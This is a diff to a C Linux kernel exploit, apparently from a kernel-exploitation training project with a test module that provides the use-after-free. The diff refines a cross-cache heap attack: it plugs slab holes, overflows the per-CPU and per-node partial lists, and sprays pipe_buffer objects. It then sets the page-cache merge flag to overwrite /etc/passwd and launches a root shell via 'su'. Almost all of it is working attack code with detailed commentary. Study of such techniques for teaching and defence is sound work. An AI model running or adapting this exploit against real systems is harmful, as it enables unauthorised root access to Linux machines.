@@ -21,11 +21,41 @@
 #include <stdlib.h>
 #include <assert.h>
 #include <sched.h>
+#include <sys/resource.h>
 #include <sys/user.h>
 #include "drill.h"
 
 #define STR_EXPAND(arg) #arg
 #define STR(arg) STR_EXPAND(arg)
+
+int increase_fd_limit(void)
+{
+	struct rlimit rlim;
+
+	if (getrlimit(RLIMIT_NOFILE, &rlim) == -1) {
+		perror("[-] getrlimit");
+		return EXIT_FAILURE;
+	}
+
+	rlim.rlim_cur = rlim.rlim_max;
+	if (setrlimit(RLIMIT_NOFILE, &rlim) == -1) {
+		perror("[-] setrlimit");
+		return EXIT_FAILURE;
+	}
+
+	if (getrlimit(RLIMIT_NOFILE, &rlim) == -1) {
+		perror("[-] getrlimit");
+		return EXIT_FAILURE;
+	}
+
+	if (rlim.rlim_cur != rlim.rlim_max) {
+		printf("[-] failed to increase max file descriptor number\n");
+		return EXIT_FAILURE;
+	}
+
+	printf("[+] increased max file descriptor number to %ld\n", rlim.rlim_cur);
+	return EXIT_SUCCESS;
+}
 
 int do_cpu_pinning(int cpu_n)
 {
@@ -73,38 +103,80 @@ int act(int act_fd, int code, int n, char *args)
 }
 
 /*
- * Cross-cache attack:
- *  - collect the needed info:
- *      /sys/kernel/slab/kmalloc-rnd-04-96/cpu_partial
- *        120
- *      /sys/kernel/slab/kmalloc-rnd-04-96/objs_per_slab
- *        42
- *  - pin the process to a single CPU
- *  - prepare the pipe infrastructure
- *  - create new active slab, allocate objs_per_slab objects
- *  - allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list
- *  - create new active slab, allocate objs_per_slab objects
- *  - obtain dangling reference from use-after-free bug
- *  - create new active slab, allocate objs_per_slab objects
- *  - free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object
- *  - free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list
- *  - allocate (objs_per_slab * 2) target objects to create and fill new target slab
- *  - perform uaf write using the dangling reference
- *  - execute the exploit primitive via the overwritten target object
+ * Collect the needed info for a cross-cache attack:
+ *
+ *  - Get the number of objects per slab containing a vulnerable object
+ *    (let's call it initial slab). For example,
+ *    /sys/kernel/slab/kmalloc-rnd-01-96/objs_per_slab is 42.
  */
 #define OBJS_PER_SLAB 42
-#define CPU_PARTIAL 120
 
 /*
- * Use the slab cache with objects of size (N * sizeof(struct pipe_buffer)),
+ *  - Get the number of per-CPU partial slabs in the initial kmem_cache
+ *    (see it in the slub_set_cpu_partial() kernel function or simply in gdb).
+ *    For example, kmem_cache.cpu_partial_slabs for kmalloc-rnd-01-96 is 6.
+ */
+#define CPU_PARTIAL_SLABS 6
+#define CPU_PARTIAL_OBJS (OBJS_PER_SLAB * CPU_PARTIAL_SLABS)
+
+/*
+ *  - Get the required minimum number of per-node partial slabs in the initial kmem_cache.
+ *    For example, /sys/kernel/slab/kmalloc-rnd-01-96/min_partial is 5.
+ */
+#define MIN_PARTIAL 5
+
+/*
+ *  - Calculate how many times we need to move per-CPU partial slabs to per-node
+ *    partial slabs to fill at least min_partial. Without this step, an empty slab
+ *    with the vulnerable object may stuck in the per-node partial list (cross-cache
+ *    attack failure).
+ */
+#define CPU_PARTIAL_TO_NODE_PARTIAL_N ((MIN_PARTIAL + CPU_PARTIAL_SLABS - 1) / CPU_PARTIAL_SLABS)
+#define NODE_PARTIAL_OBJS (OBJS_PER_SLAB * CPU_PARTIAL_SLABS * CPU_PARTIAL_TO_NODE_PARTIAL_N)
+
+/*
+ *  - Estimate the number of holes in the initial slab cache.
+ *    It can't be precise because these number change.
+ *    Calculate (num_objs - active_objs) from /proc/slabinfo for the initial slab cache:
+ *      cat /proc/slabinfo |grep "kmalloc-rnd-..-96" | awk '{print $1, $3 - $2}'
+ *    Take the biggest number of holes and multiply it by 2, for example (just to be safe).
+ *
+ *  - Estimate the number of holes in the final slab cache containing the spray objects.
+ *    Again, it can't be precise because these number change.
+ *    The pipe_buffer arrays containing N=2 objects are also allocated in kmalloc-rnd-..-96.
+ *    Hence, for the final slab cache, we can reuse the estimated number of holes from the
+ *    initial slab cache.
+ */
+#define HOLES 450
+
+/*
+ * Perform a cross-cache attack:
+ *  - pin the process to a single CPU
+ *  - plug the holes in the initial slab cache
+ *  - plug the holes in the final slab cache
+ *  - allocate objects for filling the per-node partial list later
+ *  - allocate objects for filling the per-CPU partial list later
+ *  - create new active slab, allocate objs_per_slab objects
+ *  - allocate a vulnerable object
+ *  - create new active slab, allocate objs_per_slab objects
+ *  - free 1 out of each objs_per_slab objects in the slabs reserved for the per-node partial list
+ *  - free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object
+ *  - free 1 out of each objs_per_slab objects in the slabs reserved for the per-CPU partial list
+ *    (per-CPU partial list overflow pushed the slab with the uaf object to the page allocator)
+ *  - allocate (objs_per_slab * 5) spray objects to reclaim uaf memory as a final slab
+ *  - perform uaf write using the dangling reference to the vulnerable object
+ *  - execute the exploit primitive via the overwritten spray object
+ */
+
+/*
+ * Use the final slab cache with objects of size (N * sizeof(struct pipe_buffer)),
  * which is (N * 40) bytes.
  */
-#define N		2
-#define PIPES_N		OBJS_PER_SLAB * 8
+#define N 2
+#define PIPES_N (HOLES + OBJS_PER_SLAB * 5)
+#define PIPE_BUF_FLAG_CAN_MERGE 0x10
+
 int pipe_fds[PIPES_N][2];
-
-#define PIPE_BUF_FLAG_CAN_MERGE	0x10
-
 int passwd_fd = 0;
 
 /*
@@ -233,13 +305,16 @@ int main(void)
 	ssize_t bytes = 0;
 	size_t pwd_len = strlen(pwd);
 	char *argv[] = {
-		"/bin/sh",
-		"-c",
+		"/bin/sh", "-c",
 		"(echo pwn; cat) | su -l -c \"id; cp -v /tmp/passwd.bkp /etc/passwd; id; /bin/sh\"",
 		NULL
 	};
 
 	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());
+
+	ret = increase_fd_limit();
+	if (ret == EXIT_FAILURE)
+		goto end;
 
 	ret = prepare_pipes();
 	if (ret == EXIT_FAILURE)
@@ -255,8 +330,17 @@ int main(void)
 	if (do_cpu_pinning(0) == EXIT_FAILURE)
 		goto end;
 
-	printf("[!] create new active slab, allocate objs_per_slab objects\n");
-	for (i = 0; i < OBJS_PER_SLAB; i++) {
+	printf("[!] the cross-cache settings:\n");
+	printf("\t OBJS_PER_SLAB: %d\n", OBJS_PER_SLAB);
+	printf("\t CPU_PARTIAL_SLABS: %d\n", CPU_PARTIAL_SLABS);
+	printf("\t CPU_PARTIAL_OBJS: %d\n", CPU_PARTIAL_OBJS);
+	printf("\t MIN_PARTIAL: %d\n", MIN_PARTIAL);
+	printf("\t CPU_PARTIAL_TO_NODE_PARTIAL_N: %d\n", CPU_PARTIAL_TO_NODE_PARTIAL_N);
+	printf("\t NODE_PARTIAL_OBJS: %d\n", NODE_PARTIAL_OBJS);
+	printf("\t HOLES: %d\n", HOLES);
+
+	printf("[!] plug the holes in the initial slab cache\n");
+	for (i = 0; i < HOLES; i++) {
 		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_ALLOC\n");
 			goto end;
@@ -266,8 +350,28 @@ int main(void)
 	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
 	reserved_from_n = current_n;
 
-	printf("[!] allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list\n");
-	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i++) {
+	printf("[!] plug the holes in the final slab cache\n");
+	/* Reallocate the write end of the pipe as object of size (N * sizeof(struct pipe_buffer)) */
+	for (i = 0; i < HOLES; i++) {
+		ret = fcntl(pipe_fds[i][1], F_SETPIPE_SZ, PAGE_SIZE * N);
+		if (ret != PAGE_SIZE * N) {
+			perror("[-] fcntl");
+			goto end;
+		}
+	}
+
+	printf("[!] allocate objects for filling the per-node partial list later\n");
+	for (i = 0; i < NODE_PARTIAL_OBJS; i++) {
+		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
+			printf("[-] DRILL_ACT_ALLOC\n");
+			goto end;
+		}
+	}
+	current_n += i;
+	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
+
+	printf("[!] allocate objects for filling the per-CPU partial list later\n");
+	for (i = 0; i < CPU_PARTIAL_OBJS; i++) {
 		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_ALLOC\n");
 			goto end;
@@ -286,9 +390,14 @@ int main(void)
 	current_n += i;
 	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
 
-	printf("[!] obtain dangling reference from use-after-free bug\n");
- 	uaf_n = current_n - 1;
-	printf("[+] done, uaf_n: %ld\n", uaf_n);
+	printf("[!] allocate a vulnerable object\n");
+	if (act(act_fd, DRILL_ACT_ALLOC, current_n, NULL) == EXIT_FAILURE) {
+		printf("[-] DRILL_ACT_ALLOC\n");
+		goto end;
+	}
+	uaf_n = current_n;
+	current_n++;
+	printf("[+] done, uaf_n: %ld, current_n: %ld (next for allocating)\n", uaf_n, current_n);
 
 	printf("[!] create new active slab, allocate objs_per_slab objects\n");
 	for (i = 0; i < OBJS_PER_SLAB; i++) {
@@ -299,6 +408,15 @@ int main(void)
 	}
 	current_n += i;
 	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
+
+	printf("[!] free 1 out of each objs_per_slab objects in the slabs reserved for the per-node partial list\n");
+	for (i = 0; i < NODE_PARTIAL_OBJS; i += OBJS_PER_SLAB) {
+		if (act(act_fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
+			printf("[-] DRILL_ACT_FREE\n");
+			goto end;
+		}
+	}
+	printf("[+] done, next partial slab will push the per-CPU partial slabs to the per-node partial list\n");
 
 	printf("[!] free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object\n");
 	current_n--; /* point to the last allocated */
@@ -310,23 +428,23 @@ int main(void)
 		}
 	}
 	current_n -= i;
-	assert(current_n < uaf_n); /* to be sure that uaf object is freed */
+	assert(current_n < uaf_n); /* to be sure that the uaf object has been freed here */
 	printf("[+] done, current_n: %ld (next for freeing)\n", current_n);
 
-	printf("[!] free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list\n");
-	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i += OBJS_PER_SLAB) {
+	printf("[!] free 1 out of each objs_per_slab objects in the slabs reserved for the per-CPU partial list\n");
+	for (i = NODE_PARTIAL_OBJS; i < NODE_PARTIAL_OBJS + CPU_PARTIAL_OBJS; i += OBJS_PER_SLAB) {
 		if (act(act_fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_FREE\n");
 			goto end;
 		}
 	}
-	/* Now current_n should point to the last element in the reserved slabs */
-	assert(reserved_from_n + i - 1 == current_n);
-	printf("[+] done, now go spraying\n");
+	/* Now current_n should point to the first element after the reserved slabs */
+	assert(reserved_from_n + i == current_n);
+	printf("[+] done, per-CPU partial list overflow pushed the slab with the uaf object to the page allocator\n");
 
-	printf("[!] allocate (objs_per_slab * 2) target objects to create and fill new target slab\n");
+	printf("[!] allocate (objs_per_slab * 5) spray objects to reclaim uaf memory as a final slab\n");
 	/* Reallocate the write end of the pipe as object of size (N * sizeof(struct pipe_buffer)) */
-	for (i = 0; i < PIPES_N; i++) {
+	for (i = HOLES; i < PIPES_N; i++) {
 		loff_t file_offset = 0;
 
 		ret = fcntl(pipe_fds[i][1], F_SETPIPE_SZ, PAGE_SIZE * N);
@@ -348,7 +466,7 @@ int main(void)
 	}
 	printf("[+] pipe_buffer spraying is done\n");
 
-	printf("[!] perform uaf write using the dangling reference\n");
+	printf("[!] perform uaf write using the dangling reference to the vulnerable object\n");
 	/*
 	 * Overwrite pipe_buffer flags:
 	 *  - flags in pipe_buffer are at the offset 24;
@@ -359,8 +477,8 @@ int main(void)
 		goto end;
 	printf("[+] DRILL_ACT_SAVE_VAL\n");
 
-	printf("[!] execute the exploit primitive via the overwritten target object\n");
-	for (i = 0; i < PIPES_N; i++) {
+	printf("[!] execute the exploit primitive via the overwritten spray object\n");
+	for (i = HOLES; i < PIPES_N; i++) {
 		/*
 		 * The following write will not create a new pipe_buffer, but
 		 * will instead write into the page cache, because of the
@@ -375,18 +493,8 @@ int main(void)
 			perror("[-] write short");
 			goto end;
 		}
-
 	}
 	printf("[+] wrote to pipes\n");
-
-	if (check_passwd() == EXIT_SUCCESS) {
-		printf("[+] /etc/passwd is overwritten, now try to run the root shell\n");
-		result = EXIT_SUCCESS;
-		execv("/bin/sh", argv); /* This should not return */
-		perror("[-] execv");
-	}
-
-	printf("[-] exploit failed\n");
 
 end:
 	for (i = 0; i < PIPES_N; i++) {
@@ -412,6 +520,15 @@ end:
 		ret = close(act_fd);
 		if (ret != 0)
 			perror("[-] close act_fd");
+	}
+
+	if (check_passwd() == EXIT_SUCCESS) {
+		printf("[+] /etc/passwd is overwritten, now try to run the root shell\n");
+		result = EXIT_SUCCESS;
+		execv("/bin/sh", argv); /* This should not return */
+		perror("[-] execv");
+	} else {
+		printf("[-] exploit failed\n");
 	}
 
 	return result;
